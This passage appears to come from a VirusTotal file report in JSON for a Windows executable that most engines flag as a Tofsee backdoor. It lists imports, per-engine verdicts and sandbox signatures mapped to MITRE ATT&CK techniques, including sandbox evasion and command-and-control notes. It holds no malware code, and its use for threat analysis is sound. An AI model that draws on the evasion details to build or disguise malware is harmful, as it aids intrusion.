            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "CharToOemA",
              "wsprintfA"
            ]
          },
          {
            "library_name": "WS2_32.dll",
            "imported_functions": [
              "__WSAFDIsSet",
              "accept",
              "bind",
              "closesocket",
              "connect",
              "gethostbyaddr",
              "gethostbyname",
              "gethostname",
              "getpeername",
              "getsockname",
              "htonl",
              "htons",
              "inet_addr",
              "inet_ntoa",
              "ioctlsocket",
              "listen",
              "ntohs",
              "recv",
              "select",
              "send",
              "sendto",
              "setsockopt",
              "socket",
              "WSAStartup"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "ShellExecuteA",
              "ShellExecuteExW"
            ]
          }
        ]
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 3,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 1,
        "malicious": 59,
        "undetected": 12
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Generic.4!c",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.0.0.0",
          "result": "Win.Trojan.Tofsee-7102058-0",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Backdoor.TofseePMF.S28195247",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "result": "Unsafe",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Suspicious.Win32.Save.a",
          "method": "blacklist",
          "engine_update": "20221219"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.59.46152",
          "result": "Trojan ( 0059425c1 )",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.59.46069",
          "result": "Trojan ( 004b8ae41 )",
          "method": "blacklist",
          "engine_update": "20221228"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.761bd2",
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "Win32.Trojan.Tofsee.a",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.356",
          "result": null,
          "method": "blacklist",
          "engine_update": "20221230"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "W32/Tofsee.Q.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "SymantecMobileInsight": {
          "category": "failure",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220208"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.19.0.0",
          "result": "Trojan.Ascesso!gm",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.68",
          "result": "Windows.Trojan.Tofsee",
          "method": "blacklist",
          "engine_update": "20221227"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "26514",
          "result": "a variant of Win32/Tofsee.AX",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.372",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "21.0.1.45",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Backdoor:Win32/Tofsee.ac4aaa77",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25648",
          "result": "Trojan.Win32.Invader.ewvptf",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20221231"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20221231"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Tofsee!1.AF3A (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Ad-Aware": {
          "category": "malicious",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.21.193",
          "result": "Backdoor.Tofsee.DW",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-01-02.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "1.4.1.0",
          "result": "Mal/Generic-R + Troj/Tofsee-CL",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "35289",
          "result": "MalCrypt.Indus!@1qrzi1",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Backdoor.BDS/Backdoor.Gen",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.58.8230",
          "result": "BackDoor.Tofsee.199",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4783",
          "result": "Backdoor.Tofsee.Win32.1911",
          "method": "blacklist",
          "engine_update": "20221231"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "result": "BehavesLike.Win32.Backdoor.lh",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.1.119",
          "result": "malicious.moderate.ml.score",
          "method": "blacklist",
          "engine_update": "20221223"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.mg.a57cb42761bd2238",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Backdoor.Tofsee.DW (B)",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "22.3.2.9",
          "result": "Static AI - Suspicious PE",
          "method": "blacklist",
          "engine_update": "20221003"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230101-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.Invader.bin",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "BDS/Backdoor.Gen",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Win32.Invader",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.105.174",
          "result": "Backdoor.Win32.Tofsee.ko!s1",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.19900.2",
          "result": "Backdoor:Win32/Tofsee.MAK!MTB",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "Trojan.Win32.Coinminer.11045888",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.34911B:27.30119",
          "result": "Win32.Backdoor.Tofsee.C",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1672635665",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220103"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.23.0.10340",
          "result": "Backdoor/Win32.Tofsee.R284452",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Acronis": {
          "category": "malicious",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.113",
          "result": "suspicious",
          "method": "blacklist",
          "engine_update": "20221114"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "BackDoor-FDRN!A57CB42761BD",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "result": "malware (ai score=100)",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "Exploit.UAC",
          "method": "blacklist",
          "engine_update": "20221230"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.4.4.52",
          "result": "Tofsee.Trojan.SpamBot.DDS",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Genetic.gen",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Win32.Tofsee.xa",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.GenAsa!XvO1cEIyueE",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.0.33.0",
          "result": "Backdoor.Win32.Tofsee",
          "method": "blacklist",
          "engine_update": "20230101"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.73371405.susgen",
          "method": "blacklist",
          "engine_update": "20221231"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "result": "W32/Tofsee.AX!tr",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "Gen:NN.ZexaF.36158.eqW@aiBfOGn",
          "method": "blacklist",
          "engine_update": "20221219"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "22.11.7701.0",
          "result": "Win32:BackdoorX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20230102"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "22.11.7701.0",
          "result": "Win32:BackdoorX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20230102"
        }
      },
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 1,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "1016a48908fb15bf6228eadf67560f5f406f30c5f752e6d76c260822cbf94783",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1016a48908fb15bf6228eadf67560f5f406f30c5f752e6d76c260822cbf94783"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses SMTP (mail sending)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "accept command line arguments"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              },
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "link many functions at runtime"
                  },
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "interact with driver via control codes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
